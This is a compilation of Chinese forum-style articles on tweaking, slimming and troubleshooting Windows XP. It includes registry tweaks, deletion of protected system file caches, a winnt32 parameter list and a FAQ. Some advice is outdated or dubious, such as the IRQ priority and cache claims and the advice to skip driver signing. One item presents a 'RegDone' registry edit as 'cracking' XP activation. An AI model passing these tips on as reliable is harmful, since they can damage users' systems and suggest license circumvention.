　　如果要用文件保护，重新把它值改为0就行了。 
优化八——关闭计算机时自动结束任务 
　　在关机的时候，有时会弹出讨厌的对话框，提醒某个程序仍在运行，是否结束任务。其实完全可以通过一点点修改让Windows自动结束这些仍在运行的程序。在注册表中打开HKEY_CURRENT_USER\\Control Panel\\Desktop 目录，把里面的AugoEndTasks键值改为1： 
　　注：可能会找不到AutoEndTasks键值，如果是这样的话，自己建一个串值并把它改为这个名字，值设为1就可以了。 
优化九——内存性能优化 
　　Windows XP中有几个选项可以优化内存性能，它们全都在注册表下面位置： 
　　HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ 
Session Manager\\Memory Management 
禁用内存页面调度（Paging Executive） 
　　在正常情况下，XP会把内存中的片断写入硬盘，我们可以阻止它这样做，让数据保留在内存中，从而提升系统性能。要注意的是，拥有很多内存的用户（256M以上）才好使用这个设置。这个设置的名字正如它的功能一样，叫“DisablePagingExecutive”。把它的值从0改为1就可以禁止内存页面调度了。 
提升系统缓存 
　　把LargeSystemCache键值从0改为1，Windows XP就会把除了4M之外的系统内存全部分配到文件系统缓存中，这意味着XP的内核能够在内存中运行，大大提高系统速度。剩下的4M内存是用来做磁盘缓存的，在一定条件下需要的时候，XP还会分配更多一些。一般来说，这项优化会使系统性能得到相当的提升，但也有可能会使某些应用程序性能降低。正如前面所说的，必须有256M以上的内存，才好激活LargeSystemCache，否则不要动它。 
输入/输出性能 
　　这个优化只对server用户才有实在意义——它能够提升系统进行大容量文件传输时的性能。在默认情况下，这个键值在注册表中是不存在的，必须自己建一个DWORD（双字节值）键值，命名为IOPageLockLimit。多数人在使用这项优化时都发现8到16M字节之间性能最好，具体设什么值，可以设进去试试看哪个值可以获得最佳性能。记住这个值是用字节来计算的，因此，譬如你要分配12M的话，就是12 * 1024 * 1024，也就是12582912。跟前面的内存优化一样，只有当你的内存大于256M的时候才好更改这里的值。 
优化十——加速共享查看 
　　这是一项很棒的优化，在找到这项优化之前，我经常在漫长地等待窗口显示其它机子上的共享目录中敲破头皮。通常情况下，当Windows XP连接到其它计算机时，会检查对方机子上所有预定的任务——这真是多余，而且还会让你等上30秒钟，实在太糟糕了。所幸的是，很容易就可以把这个过程给禁掉。首先，在注册表中找到HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows/Current 
Version\\Explorer\\RemoteComputer\\NameSpace。在这里面，应该有个 
{D6277990-4C6A-11CF-8D87-00AA0060F5BF}键。只需把它删掉，重新启动计算机后，Windows就不再检查预定任务了，速度明显提高！ 
优化十一——手动指定进程次序 
　　同时按下Control+Alt+Delete三个键，然后点击“Processes（进程）”选项卡，可以看到一个如上图所示的对话框，在这里可以看到目前正在运行的所有进程。如果要为一个程序分配更多的进程时间，如3D Studio Max，只需右键点击这个进程，再把鼠标指针向下移动到“Set Priority>（设置优先级）”，然后选择你想要这个程序处在哪个优先级。当我接收email时，我会把3DMAX设为“标准”，但当我离开计算机的时候，我会把它的优先急提升为最高的“实时”，这样可以计算机更专注更快速地处理3D动作。 
优化十二——为IRQ中断请求排优先次序 
　　这是本优化指南的最后一项优化，也是一项非常有效的优化。计算机的每一个主要部件都设了个IRQ中断号。这里就是要通过修改每个IRQ请求的优先次序达到优化目的。这里主要的优化对象是系统/CMOS实时钟，它通过主板来提升性能。首先，要确定你想要哪个组件获得更高的性能，然后找到这个硬件正在使用的IRQ中断号。怎么找呢？打开控制面板里的系统属性（也可以按键盘上的Windows+Break热键组合打开它）。选中“硬件”选项卡，然后点击“设备管理器”按钮。 
　右键点击要查IRQ号的组件，选择“属性”，然后点击“资源”选项卡。 
这里可以看到设备正在使用的IRQ中断号（如果没有IRQ中断号，选择另一个设备）。把中断号记下来，然后运行注册表编辑器regedit，找到注册表中的HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\ 
PriorityControl 位置。我们要在这里建立一个名为IRQ#Priority（其中“#”是具体的IRQ中断号）的DWORD双字节值，然后把它的值设为1。譬如说，我的系统CMOS实时钟的IRQ中断号是8，我要建立的键名就是IRQ8Priority。 
　　重新启动计算机之后，就会发现刚优化过的组件性能有所提高。笔者强烈建议用这个方法优化系统CMOS实时钟，因为它能改善整块主板的性能。当然也可以把多个IRQ中断号优先级提高，但这样做的效果没那么好，而且有可能造成系统不稳定。要把这个优化设置撤消的话，只要把刚才建立的注册表键值删掉就OK了。 
　　结语 
　　Windows XP优化指南就写这么多，希望无论在外观还是性能上都能为你带来一些好处。
14：WINDOWS XP终极減肥大法 
xp用起来确实不错，但是体积有点太大了，最初的安装就有1.3g，如果是使用 免激活的英文2600＋中文汉化包体积会更大。我在网上征集众多高人的经验和 我的本人的意见创作出xp终极瘦身大法，在这里跟大家分享。 
1. 删除系统文件备份 sfc.exe /purgecache （一般用户是不怎么用的） 
2 删除驱动备份 windows\driver cache\i386目录下的Driver.cab文件 （73mb) 
3. 取消系统还原 （总体来说系统还原功能还是不错的，建议除了xp安装的那个 盘使用，其它盘都别用，如果哪一天硬盘的空间不够了，可以通过系统清理程 序删除一些比较早的还原点） 
4、删除帮助文件（减掉40多mb) （使用中文汉化包的文件大小为92兆，刚开始 使用xp的同志最好别删） 
5、删掉\WINDOWS\system32\dllcache下文件（减去200——300mb)。 
（这是备用的dll文件，只要你拷贝了安装文件，完全可以这样做。既然这样删你 没话说） 
6、把我的文档、IE的临时文件夹都转到其他盘（分区）。 （同时对系统的速 度，和硬盘都有好处，如果使用的是双系统，最好把两个系统的IE临时文件都 放在同一个文件夹，这样既加快速度有节省空间） 
7、把虚拟内存也转到其他盘。 （最好就是将这些东西和平时临时下载文件放 在一个不大的分区里，这样也方便整理硬盘） 
8、将应用软件装在其他盘（这对重装系统也有好处，可以省很多事）。 
9、删除\windows\ime下不用的输入法！ （日文，韩文，繁体中文输入 法，84.5MB） （到底哪个是哪个自己研究一下吧！有时候也要自己动动脑子 的，锻炼一下吧！） 
10、如用ntfs装xp,本身就节省地盘。 
注意：有些文件的删除可能有潜在的危险性，如果对windows了解不多请慎用 此法，如果出错的话本人盖不负责。（操作前请找到文件夹选项，将文件查看 选择为显示所有文件，显示受系统保护的文件，否则有些文件找不到） 
编者的按：原则来说这么来给系统减肥我们是不支持的。仅限于玩家一种学习 和了解。如果您的机器上有重要的数据请备份好。再试试操作一下 
15：Windows XP主要问题以及解决方法一览 
在Windows XP操作系统下，Windows messenger的语音聊天功能无法联接，而一些其它即时语音聊天软件则没有此类问题，如Yahoo Messenger甚至更早的MSNMessenger。还有用户无法保存对Windows XP资源管理器窗口浏览模式的设置，导致用户每次打开资源管理器时都不得不重新进行设置。工具条提示栏中的提示信息无法突出显示。有用户报导甚至Windows升级程序本身也存在问题，有时用户已经升级了某个补丁，而升级程序却不能记忆。 
此外Windows XP在关机过程中有时也会出现死机现象，而且与以往版本相同的是Windows XP仍然没有完全解决蓝屏死机的问题，当用户运行一些与系统不兼容的驱动程序或应用程序时，操作系统就有可能自动重新启动。使用Outlook Express的用户在系统从老Windows操作系统升级至Windows XP系统时会发现他们的收件箱未能成功升级。虽然原有收件箱的内容仍然保留在硬盘上，但用户只能手功将信息转移至当前保存位置，或者对OutlookExpress进行重新设置，搜索保存在硬盘上的原有信息。 
Windows XP主要问题详见下表： 程序 问题 修补 
光盘刻录 使用Windows XP系统刻录的光盘在Windows95/98系统操作环境或是在MP3播放器上无法读取或丢失部分文件或文件夹。 可升级补丁 
电源管理 不支持Pentium III和Athlon的CPU电源管理功能，导致使用这两种类型CPU的笔记本电脑能耗消耗较大。 可升级补丁，详情请见相关链接： 
PentiumIII 
Athlon 
关机 系统关机过程中有时在屏幕显示"Saving your Settings"（保存设置）的信息时会出现死机现象。 可从Windows升级产品目录中获得升级补丁。从StartàAll ProgramsàWindows Update中选择PersonalizeWindows Update，点击Display the Link。 
AOL 6.X 某些版本与Windows XP不兼容 升级至AOL 7.0或升级至可兼容的AOL 6.X版本 
Ghost 2001 与Windows XP不兼容 升级至Ghost 2002 
McAfee VirusScan杀毒软件 与Windows XP不兼容 对于版本号在4.5至5.21之间的该套软件，从Windows升级库中下载兼容补丁包。版本号更早的程序必须要升级至6.0X 
Outlook Express 当老版本的Windows操作系统升级至Windows XP后，文件及设置转移向导程序可能丢失统计数据或原有统计数据被新数据覆盖。如果在Windows9X/Me系统上运行Windows XP的Outlook Express程序，信息存储功能可能失效。 可升级补丁 
PowerQuest Drive Image 与Windows XP不兼容 升级至PowerQuest Drive Image 5.0版本 
PowerQuest PartitionMagic 与Windows XP不兼容 升级至PowerQuest PartitionMagic 7.0版本 
QuickTime 5 程序无法自动播放内嵌在网页中的关联电影文件 从Apple网站下载IE 6兼容插件。 
远程协助 当系统需要的协助超过一个网络连接（如有一个网络适配器和一个调制解调器）且使用个人防火墙时，远程协助可能失效。 升级补丁 
Roxio Easy CD Creator 与Windows XP不兼容 对于5.0白金版的用户，从Roxio网站下载免费升级至5.1版本的升级程序。对于5.0标准版的用户，下载有90天试用期的5.1白金版升级程序，等待5.1标准版用户升级程序的提供。对于4.02版本的用户，下载Windows升级程序（该升级补丁的兼容性尚未得到软件生产商的确认。） 
Symantec Norton AntiVirus 2001 与Windows XP不兼容 从Windows升级网站上下载兼容补丁（该升级补丁的兼容性尚未得到软件生产商的确认。）也可升级至Norton AntiVirus2002版。 
Symantec WinFax Pro 10 与Windows XP不兼容 升级至WinFax Pro 10.02版。 
Windows Messenger 音频视频聊天模块与Internet Connection Sharing或ICS防火墙不兼容。 无升级补丁 
Windows Messenger 音频有时出现爆破声和回音 可从Windows升级库中升级补丁。 
ZoneAlarm Pro 某些版本阻止所有网络联接或导致计算机突然重新启动。 点击设置按钮，选择升级功能，升级至2.6.357版本或其后的版本。 
16：WindowsXP不能正常关机的解决之道 
　　朋友陆很会紧跟潮流，中文版windowsXP发布还没有几天，他已经将XP装到硬盘里去了。安装也还顺利，不过却无法正常关机。出了这种情况，当然该我出手了。 
　　朋友的电脑配置是：K6-2 266MHz @300MHz ，MVP3（AT板型）主板，160 MB SDRAM（PC100)，FUJITSU 10G硬盘，CMI-8330 ISA接口声卡，显卡是SIS6326，AT电源。 
　　过去一看，原来执行关机操作后，并不是显示“现在可以安全的关机了”（如果是ATX主板加ATX电源，当然是自动关机），而是重新启动，只能手动强制关机。 
　　其实关机不正常的情况在windows98SE是非常多见的一个情况。常见的原因有： 
1.操作系统及主板对ACPI或APM支持不够完善。 
2.主板之外的各种硬件对ACPI或APM支持不够完善。 
3.硬件驱动程序的BUG。 
4.主板的BIOS需要改进。 
5.系统对快速关机支持不够好（仅对windows98而言)。 
6 关机前有一些常驻内存的程序示退出并与系统的关机进程有冲突。 
7 病毒。 
8 磁盘子系统的故障，如IDE驱动程序与系统兼容性不够好。 
　　当然还有许多其它方面的原因，笔者不可能在此一一赘述。 
因为朋友是新安装的操作系统，除了声卡的驱动外（其它硬件因操作系统自带驱动），尚未安装各种应用程序。所以笔者将问题的重点放在主板及操作系统对电源管理的支持不够完善上。秉着先易后难的原则，首先进入主板的CMOS设置界面，在power management里将PM control by APM关闭,启动进入系统后，再关机，电脑仍然重启。 
　　再启动windowsXP，依次进入控制面板\电源管理，点击“休眠”选单，此时启用休眠处于未选中状态，遂勾选“启用休眠”，可仍未能见效。 
　　重新进入控制面板里的电源选项，点击“高级电源管理”子页，系统显示:本机支持高级电源管理（APM），使用APM可降低系统的电源损耗。而此时“启用高级电源管理支持”处于选中态。毫不犹豫地去掉“启用高级电源管理支持”，多耗点电都也罢了，不能正常关机，多别扭啊。接下来当然是关机，OK，“现在可以安全的关机”几个字样出来了，哈哈，蛮亲切的嘛。 
　　本例是由于本系统对高级电源管理支持不够好所致，或可通过升级BIOS消除故障，只是此主板已是年代久远，可能已找不着更新的BIOS了，所以未曾尝试，对ATX主板，建议仍然启用高级电源管理，否则亦会有可能出现麻烦呢。 
17：WINDOWSXP使用问题解答 
问： 为何我安装了Windows XP后，点击关机却总是变成重启？ 
答: 这是由于有些主板的高级电源管理不能被Windows XP支持。一般用AWARD的BIOS主板的电脑没有这个问题。到目前为止，遇到AMI的BIOS的主板有这个问题。解决的办法是升级你的BIOS，即刷新BIOS。不过可要谨慎，以免刷错了型号。 
问： 我先安装了Win XP，它没有提供双引导选项。我还想再装一个Win 98，如何把Win XP的双引导菜单调出来？ 
答: 你可在Win XP基础上直接安装Win 98，完成之后只能进入Win 98。此时运行Win XP的安装程序，选择“修复安装”即可。再次启动即出现双引导菜单。 
问： 如果硬件或BIOS与Windows XP的ACPI规格不符时，在安装时会有什么问题？ 
答: 如果安装Windows XP时，第一次重新启动计算机后，画面就停留在Windows XP启动画面，无法完成安装程序。建议你与主机板厂商联系，更新你的BIOS。若你无法立即更新BIOS，你可以进入BIOS选单，查看Bios Power Management Setup中Disable \"ACPI function\"。并重新运行Windows XP。安装时按F5，在出现的选项中，选择Standard PC，以便完成Windows XP安装。但完成安装后将无法使用ACPI各项功能。 
问： 是否所有的XP都要激活？如果不激活可不可以用？那要怎么样激活？ 
答: 在Windows XP操作系统中，微软采用了一种“激活”技术。要求使用XP的用户在首次安装系统后的30天内，通过互联网或电话，将系统根据用户硬件配置生成的一组代码和Windows自带的序列号向微软的激活中心注册，否则XP将自动锁定。激活后如果用户多次更换系统硬件或购买新的机器后，也都必须重新激活。这项技术的实质在于保证微软授权的每一个Licence（认证）都只能在一台机器上使用，从而防止盗版商只用一个序列号就能生产出大量盗版XP的现象。 
问： 我的电脑是双系统，Win 98在C盘，Win XP在D盘。如果要格式化C盘重装Win 98，在不重装Win XP的情况下，有什么办法恢复双启动？ 
答: 只管格式化C盘重新安装Win 98好了，安装完成你会发现失去双引导菜单，而失去双引导则意味着无法启动XP。不要紧，重新运行XP的安装程序，选择“修复”安装即可。放心，“修复”安装并非意味着重新安装。 
问： 在局域网里如何让Windows 2000访问Windows XP？ 
答: 先在Windows XP控制面板->用户帐号中添加新的用户，设置好权限之后就可以在Windows 2000里以新添加的用户名与密码来访问Windows XP了。如果你使用的XP是Professional版本，也可以开放guest权限，这样就不需要再新添加用户，任何机器都可以访问XP了。 
问： 我有一个Dell的USB 9985键盘，结果在Win 98的纯DOS模式下不能够使用，而在Win 98和Win XP里面使用正常。怎么办？ 
答: USB设备一般都需要驱动的，9985键盘是USB键盘，所以要先驱动USB端口，在CMOS里面可以进行此项工作，一般CMOS中的Chipset Features里面都有USB KB/Mouse Legacy选项，选择Keyborad就可以了。 
问： 我的Windows XP下的Internet Explorer运行很慢，为什么？ 
答: 如果你机器的CPU和内存够用的话，一般没这个问题。Win XP在256M内存以下运行和256M内存以上运行的效果简直是天壤之别哟。不过嘛，我发现如果对IE的高级选项里的东西做了改动，如添加一些效果，也会使IE变慢，尤其是显示上面的菜单和工具栏的时候。解决办法就是“高级选项”的面板上，点击“默认”，使用IE默认的设置即可。 
问： 为何我的Modem不能在XP下工作？ 
答: 这个主要是因为驱动程序的问题。很多Modem的Win 2000驱动程序也不能在XP下用了，不过倒是有些Modem的Win 98的驱动程序可以在XP下用。另外，金网霸ESS芯片的内置Modem以及一些Rockwell芯片的内置Modem都可以在XP下很好的工作，用XP自带的驱动即可。而且对于金网霸内置Modem的用户，在XP下没有了像Win 2000下那样电话打进来就死机的问题了。 
问： 我的Windows XP安装了简体中文语言包后还是英文的，怎么设置啊？ 
答: 在一些BBS上，我发现很多朋友不大会安装这个语言包。其实安装好了后，欢迎屏幕已经由WELCOME变成欢迎了。至于界面，到“控制面板”－“地区区域选项”－“菜单显示”，选择简体中文，注销后重新登录即可。如果你不选择所有用户都使用这个配置的话，你会发现，其它用户里面还是英文界面的。哈哈，这次可以中英文版同时用了。 
问： 为何我在DOS下安装Windows XP很慢？ 
答: 很多朋友在DOS下安装Windows XP或者Windows 2000的时候，如果没有在安装前运行smartdrv.exe，安装过程就会非常缓慢，可能一个晚上你也安装不完。smartdrv.exe文件在Windows 98/Me的光盘或是Windows系统目录的command目录里。 
问： 为何在Windows XP的安装过程中系统提示我必须转化分区为NTFS格式？ 
答: 这是因为你在Windows下安装的时候安装的不仔细，刚开始安装的时候有个“高级”－在安装过程中允许我选择安装到的分区。重新运行安装程序，记得选择这个，然后重新启动后就可以选择安装到的分区和是否保留原分区格式，或是格式化为NTFS OR FAT32等等。 
问： 我现在是用的是Win Me，可以直接升级到XP吗？ 
答: Windows XP在升级安装上做得十分出色，它的安装方式有三种：升级安装、双系统共存安装和全新安装。我们可在以前的Windows 98/Me/NT4/2000这些操作系统的基础上顺利升级到Windows XP。注意，Win 95、Win NT 3.51以及再早一些的Windows系统是不能升级到Windows XP的。 
问： 我最近碰到一个问题，当我安装好Win 98后，再安装Win 2000或XP的时候，总是在拷贝完文件后跳回或是死机，为什么？ 
答: Win 98是基于DOS的操作系统，尤其是因为要管理好内存，Win 98会在CONFIG.SYS里加载HIMEM.SYS和EMM386.EXE，即使无CONFIG.SYS，Win 98也会在图形界面初始化的时候加载HIMEM.SYS。而这两个管理基本内存的文件，带有多种参数，不同的配置会带来不同的内存分配环境。当然，系统过热比如风扇停转的时候，也会表现出这些症状，您应该首先检查硬件的基本情况如风扇和连线的正常与否。如果你的系统是超频的又不能正常安装话，请降低回正常的频率后再安装Win 2000和XP，成功率较高些。 
18 WinXP安装参数 
我们看看winnt32.exe有哪些参数可以使用。 
winnt32.exe位于i386目录里面。这个文件可以直接运行于windows下面，其具体参数有： 
安装或升级到 Windows XP。在运行 Windows 95、Windows 98、Windows Me、Windows NT、Windows 2000 或 Windows XP 的计算机上，可以从命令提示符中运行 winnt32。 

语法 
winnt32 [/checkupgradeonly] [/cmd:command_line] [/cmdcons] [/copydir:i386\folder_name] [/copysource: 
folder_name] [/debug[level]:[filename]] [/dudisable] [/duprepare:pathname] [/dushare:pathname] [/m:folder_name] [/ 
makelocalsource] [/noreboot] [/s:sourcepath] [/syspart:drive_letter] [/tempdrive:drive_letter] [/udf:id [, 
UDB_file]] [/unattend[num]:[answer_file]] 
参数 
/checkupgradeonly 
检查计算机与 Windows XP 的升级兼容性。 
如果在使用该选项时使用了 /unattend，则不需要用户输入。否则，结果将显示在屏幕上，并且可以用您指定的文件名保存它们。默认的文件名为 Upgrade.txt（位于 systemroot 文件夹）。 
/cmd:command_line 
指示安装程序在执行最后阶段的安装前，运行一个特殊的命令。这将在计算机重新启动两次并且“安装程序”收集了必要的配置信息后，以及“安装程序”结束之前发生。 
/cmdcons 
在运行的计算机上将“故障恢复控制台”作为启动选项安装。恢复控制台是一个命令行界面，可以用它执行诸如启动和停止服务以及访问本地驱动器（包括 NTFS 格式的驱动器）这样的任务。只有在常规安装完毕后，才可以使用 /cmdcons 选项。 
/copydir:i386\folder_name 
在安装 Windows XP 文件的文件夹内另外创建一个文件夹。 
文件夹名是指您为保存对站点所进行的修改而创建的文件夹。例如，您可以在安装程序的 i386 源文件夹中创建名为 Private_drivers 的文件夹，用来存放驱动程序文件。然后，您可以键入 /copydir:i386\Private_drivers 让安装程序将该文件夹复制到新安装的计算机上，并建立新的文件夹位置 systemroot\Private_drivers。还可以使用 /copydir 命令创建任意多个其他的文件夹。 
/copysource:folder_name 
在安装 Windows XP 文件的文件夹内另外创建一个临时文件夹。 
文件夹名是指您为保存对站点所进行的修改而创建的文件夹。例如，您可以在安装程序的源文件夹中创建名为 Private_drivers 的文件夹，用来存放驱动程序文件。然后，您可以键入 /copysource:Private_drivers 以使安装程序将该文件夹复制到最新安装的计算机上，并在安装期间使用它的文件，从而建立临时文件夹位置 systemroot\Private_drivers。还可以使用 /copysource 命令创建任意多个其他的文件夹。与 /copydir 创建的文件夹不同，/copysource 创建的文件夹在安装完成后即被删除。 
/debug[level]:[filename] 
在指定等级处创建调试日志，例如，/debug4:Debug.log。默认日志文件为 C:\systemroot\Winnt32.log，并且默认调试等级为 2。日志等级如下所示：0 -- 严重错误、1 -- 错误、2 -- 警告、3 -- 通知、4 -- 用于调试的详细信息。每个级别都在其下包括一些子级别。 
/dudisable 
禁用“动态更新”。没有“动态更新”，安装程序仅能在初始安装文件下运行。即使使用应答文件并在该文件中指定“动态更新”选项，该选项仍会禁用“动态更新”。 
/dushare:pathname 
将以前从 Windows Update 网站下载的“动态更新”文件（更新的文件在安装时使用）的目录指定为共享。当从安装共享处运行并使用 /duprepare 时，该选项将执行准备操作，这样，经过更新的文件才能在基于网络的客户端安装中使用。如果没有使用 /duprepare 并且在客户端上运行，则指定客户端安装将使用位于 pathname 所指定的共享位置的更新文件。 
/duprepare 
进行安装共享准备，使从 Windows Update 网站下载的“动态更新”文件可以使用它。然后，该共享可用于多个客户端的 Windows XP 安装。只能与 /dushare 一起使用。 
/m:folder_name 
指定“安装程序”从备用位置复制替换文件。指导“安装程序”首先在备用位置中查看，如果有文件显示，则应使用这些文件而非默认位置中的文件。 
/makelocalsource 
指示安装程序将所有的安装源文件复制到本地硬盘上。当采用从光盘安装时，使用 /makelocalsource 可以在以后没有光盘的情况下，为计算机提供安装文件。 
/noreboot 
指导“安装程序”在结束文件复制阶段之后不重新启动计算机，这样您就可以执行另一个命令。 
/s:sourcepath 
指定 Windows XP 文件的源位置。要同时从多个服务器复制文件，请多次键入 /s:sourcepath 选项（最多八次）。如果输入多次选项，则所指定的第一个服务器必须是可用的，否则“安装程序”失败。 
/syspart:drive_letter 
表明可以将安装启动文件复制到一个硬盘上，并将硬盘标记为活动，然后将该磁盘安装到其他计算机上。启动该计算机时，它将自动启动下一阶段的安装。但必须始终同时使用 /tempdrive 参数和 /syspart 参数。 
在运行 Windows NT 4.0、Windows 2000 或 Windows XP 的计算机上，可以使用 /syspart 选项来启动 Winnt32。运行 Windows 95、Windows 98 或 Windows Me 的计算机不能使用该选项。 
/tempdrive:drive_letter 
指导安装程序将临时文件放置到指定部分。对于全新安装， 可以将 Windows XP 安装在指定的分区。对于升级安装， 
/tempdrive 选项仅影响临时文件的位置，而操作系统的升级则在运行 winnt32 的分区中进行。 
/udf:id [,UDB_file] 
指出安装程序用来指定“唯一数据库”(UDB) 文件如何修改应答文件的标识符 (id)（请参阅 /unattend 项）。 
UDF 会覆盖应答文件中的一些值，且标识符会决定使用 UDF 中的哪些值。例如，/udf:RAS_user,Our_company.udb 会覆盖Our_company.udb 文件中为 RAS_user 标识符指定的一些设置。如果没有指定 UDF_file，安装程序会提示用户插入一张含有Unique.udb 文件的磁盘。 
/unattend 
以无人参与的安装模式升级 Windows 98 或 Windows Me 以前的版本。因为所有用户设置都可以从上一次安装中获得，所以在安装过程中并不需要用户干预。 
/unattend[num]:[answer_file] 
在无人参与安装模式下执行干净安装。所指定的应答文件为安装程序提供了您自定义的设置信息。 
Num 是在安装程序结束复制这些文件与重新启动计算机之间间隔的秒数。在运行 Windows 98、Windows Me、Windows NT、Windows 2000 或 Windows XP 的任何计算机上都可以使用 num 选项。 
如果使用 /unattend 命令行选项来自动完成安装程序，则表示您已经阅读和接受了 Windows XP 的 Microsoft 许可协议。在代表某个组织而不是您自己使用该命令行选项来安装 Windows XP 之前，您必须确认最终用户（无论是个人还是单个实体）已经接收、阅读并接受 Windows XP 的 Microsoft 许可协议的条款。OEM 在销售给最终用户的机器上可能不会指定此值。 
19:XP的常用操作及技巧 £  
<清除 WinXP Shared Folders--就是在“我的计算机“里那些碍眼的分享数据夹> 
--请从registry删掉以下code-- 
HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Explorer \ 
My Computer \ NameSpace \ DelegateFolders \ {59031a47-3f72-44a7-89c5-5595fe6b30ee} 
***加速XP的开关机 *** 
缩短等待时间 
开启注册表编辑器，找到 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control， 
将 WaitToKillServiceTimeout 设为：1000或更小。 
找到 HKEY_CURRENT_USER\Control Panel\Desktop 键，将右边窗口的 WaitToKillAppTimeout 改为 1000， 
即关闭程序时仅等待1秒。将 HungAppTimeout 值改为：200，表示程序出错时等待0.5秒。 
让系统自动关闭停止响应的程序。打开注册表 HKEY_CURRENT_USER\Control Panel\Desktop 键， 
将 AutoEndTasks 值设为 1。 

加快选单显示速度 
开启注册表编辑器，找到 HKEY_CURRENT_USER\Control Panel\Desktop， 
将其下的 MenuShowDelay 项改为：0，你的选单将会出乎意料地快。 
以上调整项目我亲自试过.真的变快很有效! ^^... 
B.***XP减肥方法 *** 
1. 删除系统文件备份 
sfc.exe /purgecache 
2 删除驱动备份 
windows\driver cache\i386目录下的Driver.cab文件 （73mb) 
3. 取消系统还原 
4、删除Help档（减掉40多mb) 
5、删掉\WINDOWS\system32\dllcache下档（减去200——300mb),这是备用的dll档， 
只要你已拷贝了安装文件，完全可以这样做。 
6、把我的文件、IE的临时文件夹都转到其它硬盘（分区）。 
7、把虚拟内存也转到其它硬盘。 
8、将应用软件装在其它硬盘（这对重装系统也有好处）。 
9、删除\windows\ime下不用的输入法！ （日文，韩文，简体中文输入法，84.5MB） 
10、如用ntfs装xp,本身就节省硬盘。 
开完机后可以试试在 执行列上打... 
oobe/msoobe /a 
如果出现... 
Windows 产品启用 
Windows 已经启用。请按[确定]结束。 
XP版本 
找寻计算机中windows/system32/NTOSKRNL.EXE 的这个档-->按右键-->选内容 
辨认真假中文版XP的方法 
1.执行超级终端机.是否为中文接口及中文名称抬头 
2.寻找dxdiag.exe并执行.看看directx诊断程序中的系统信息 
-->看看系统信息中的操作系统版本是否为5.1build2600 
-->看看系统信息中的语言及区域设定是否都为中文 
(如果是就没问题啰) 
XP要做开机磁盘 
在A槽-->按右键-->选格式化-->选建立一个MS-DOS开机磁盘 
WinXP的ADSL拨接功能 
方法:控制台-->网络联机-->建立一个新联机-->联机到因特网 
-->手动设定我的联机-->使用需要使用者名称和密码的宽频联机来联机 
-->ISP名称(随便填你想要的,如Hinet...)-->使用者名称.密码就填拨接账号与密码 
-->下面3选项看需要可选可不选(其实XP内建的防火墙功能不错)-->完成 
P.S 如要开机就自动拨接上网的话,把联机ICON抓到启动中,应该就可以啰 
XP的网络芳邻(先假设网络都没问题) 
控制台-->使用者账户-->建立新的账户 
-->输入那台计算机的开机账号(计算机名称)及密码 
-->选择“受限制的账户“-->完成 
这样别人就可以登陆你的计算机里啰 
XP里怎么开DMA 
关于DMA: 
到装置管理员里选择IDE ATA/ATAPI controllers 
到Primary/Secondary IDE Channel里面的进阶设定 
将所有的转送模式都设定为使用DMA(如果可用的话) 
系统就会自动打开DMA支持(在BIOS里也应该要先设为支持DMA) 
XP里关闭光盘Autorun功能 
1.打开光驱的内容,将自动拨放里所有的光盘格式都设为不要有任何动作 
OR 
2.利用Group Policy (执行gpedit.msc) 
到计算机设定-->系统管理模板-->系统 
找到-->关闭自动拨放 
按右键选-->内容,选择已-->启用, 
在下面那里选-->所有的磁盘驱动器, 
然后套用,重新开机,应该也可以,但是这个方法不能关闭音乐CD的自动拨放 
XP的自动关机问题 
如果不能自动关机的话 
控制台-->电源-->显示-->屏幕保护程序-->电源管理-->APM打勾 
这样应该就可以了 
如果还不行,应该是BIOS的问题 
XP关闭系统休眠功能 
因为休眠功能占的硬盘空间蛮大的, 
所以关闭比较好, 
控制台-->电源选项-->休眠(不要打勾) 
窗关错误回报 
控制台---->系统---->进阶---->右下角--->错误报告---->关闭 
XP安装驱动程序往往因为数字签署ㄉ关系挂不上去-----> 
把数字签署忽略掉===> 
控制台----->系统------>硬件----->装置管理员----->驱动程序签署---->略过 
使用Winxp的网友请务必检查一下 
开始-->>执行-->>regedit 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion] 
将 “RegDone“ = 的数值，由 “0“ 改成 “1“ 
如此才算完全“破解“ ,这个动作很重要 
很多奇怪的小毛病因此而解决 
请大家务必检查一下........... 
WinXP执行时候为什么都会停顿一下呢? 
开始~联机~显示所有联机 
按~局域网络~右键~选内容 
在一般下面~选Internet Protocol(TCP/IP)~按内容 
使用下列的ip地址~第一个192.168.0.1~第二个打255.255.255.0 
这样就好了~以后开机就不会停顿了 
20:防范Windows XP的安全策略 
　　尽管Windows XP刚刚推出没有多长时间，但是Windows XP凭借其超强的稳定性和可靠的安全性还是吸引了不少用户在第一时间内去使用它。笔者在与Windows XP的短暂“接触”中，细心留意了一些安全方面的操作策略，现在把它整理成文，以期抛砖引玉。 
　　1、屏蔽不需要的服务组件 
　　尽管服务组件安装得越多，用户可以享受的服务功能也就越多。但是用户平时使用到的服务组件毕竟还是有限，而那些很少用到的组件不但占用了不少系统资源，会引起系统不稳定外，它还会为黑客的远程入侵提供了多种途径，为此我们应该尽量把那些暂不需要的服务组件屏蔽掉。具体的操作方法为：首先在控制面板中找到"服务和应用程序"图标，然后再打开"服务"对话框，在该对话框中选中需要屏蔽的程序，并单击鼠标右键，从弹出的快捷菜单中依次选择"属性"/ "停止"命令，同时将"启动类型"设置为"手动"或"已禁用"，这样就可以对指定的服务组件进行屏蔽了。 
　 
　　2、起用电源保护功能 
　　使用电脑处理文件时，最担心的就是计算机突然掉电，因为这种突然掉电不但会使自己的辛勤劳动成果顷刻间化为乌有，严重的话还能使计算机受到损伤。为了防止各种情况下的意外掉电，保证计算机的安全正常工作，我们应该在电源管理中启用按下电源按钮时询问或直接休眠的功能。如果您要启动电源保护功能的话，可以用鼠标在Windows XP的桌面上依次单击“我的电脑”/“控制面板”/“电源选项”，在弹出的设置框中选择“高级”标签，在对应的标签页面下找到“按下计算机电源按钮时”设置项，然后在设置框中选择“休眠”或者“问我要做什么”选项，如果选择“关机”选项的话，就相当于没有起用电源保护功能。 
　　3、对重要信息进行加密 
